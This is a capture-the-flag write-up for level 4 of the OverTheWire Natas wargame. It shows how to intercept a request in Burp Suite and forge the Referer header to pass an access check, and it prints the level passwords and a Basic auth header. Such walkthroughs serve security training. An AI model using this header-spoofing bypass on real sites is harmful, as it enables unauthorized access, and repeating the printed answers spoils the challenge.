### *Challenge Name:* **`Natas4`**
### *Level:* **`Level 4`**


- Username: natas4
- Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
- URL: http://natas4.natas.labs.overthewire.org

# Solution:
![image](https://user-images.githubusercontent.com/33517160/115159993-8d402400-a09e-11eb-9d2e-554e5d0d75c6.png)

now i think we got to the real work, nothing on the source code but this:

`<div id="viewsource"><a href="index.php">Refresh page</a></div>`

and this message: ` Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

everytime we refresh the referrer changes so we see that it keeps track from where we came from
i think we need to interrupt the HTTP Request and modify it to change the referrer to http://natas5.natas.labs.overthewire.org/ you can use 2 proxy tools for this `OWASP Zap & Burp suite` i used burp just because i have it installed in my machine.

refresh and interrupt the request for `index.php`:
```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Referer: http://natas4.natas.labs.overthewire.org/index.php
Upgrade-Insecure-Requests: 1
```

change Referer to `http://natas5.natas.labs.overthewire.org/`

after forwarding the request we get the password:
![image](https://user-images.githubusercontent.com/33517160/115161506-c4b2ce80-a0a6-11eb-910d-f218eb2d7328.png)

### natas5 password: **`iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`**
